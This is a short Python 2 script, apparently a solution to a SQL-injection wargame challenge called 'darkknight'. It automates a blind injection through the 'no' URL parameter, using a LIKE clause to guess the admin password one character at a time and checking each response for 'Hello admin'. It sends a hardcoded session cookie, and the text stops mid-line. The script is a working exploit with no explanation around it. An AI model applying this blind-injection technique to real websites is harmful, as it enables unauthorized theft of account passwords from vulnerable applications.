import urllib2

baseurl = 'http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no=3%20or%20id%20like%20"admin"%20and%20pw like "{}%"'

compares = range(32, 127)

result = ''

for i in range(1, 9):
    for c in compares:
        if(chr(c) == '%'):
            continue

        url = baseurl.format(result + chr(c))

        print url

        connection = urllib2.Request(url)
        connection.add_header('User-Agent', 'Mozila/5.0')
        connection.add_header('Cookie','PHPSESSID=f1lidgl6kikpbb0sclsfougrl2')

        content = urllib2.urlopen(connection).read()

        if content.find('Hello admin') != -1:
            result += chr(c)
            pr